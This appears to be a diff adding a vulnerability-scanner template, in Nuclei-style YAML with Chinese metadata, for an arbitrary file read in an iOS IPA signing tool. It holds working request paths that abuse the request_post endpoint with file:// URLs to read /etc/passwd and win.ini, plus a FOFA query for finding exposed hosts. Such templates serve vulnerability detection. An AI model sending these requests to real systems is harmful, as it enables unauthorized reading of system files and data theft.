@@ -1,0 +1,38 @@
+id: apprelease-ios-ipa-request_post-fileread
+info:
+  name: 苹果 IOS 端 IPA 签名工具 request_post - fileread
+  author: leadlife
+  severity: high
+  description: 苹果IOS端IPA签名工具request_post任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
+  reference: 
+    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E5%88%86%E5%8F%91%E7%AD%BE%E5%90%8D%E7%B3%BB%E7%BB%9F/%E8%8B%B9%E6%9E%9CIOS%E7%AB%AFIPA%E7%AD%BE%E5%90%8D%E5%B7%A5%E5%85%B7request_post%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/assets/index/css/mobileSelect.css"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,ios,apprelease
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/index/request_post?url=file:///etc/passwd&post_data=1"
+      - "{{BaseURL}}/api/index/request_post?url=file://c:/windows/win.ini&post_data=1"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
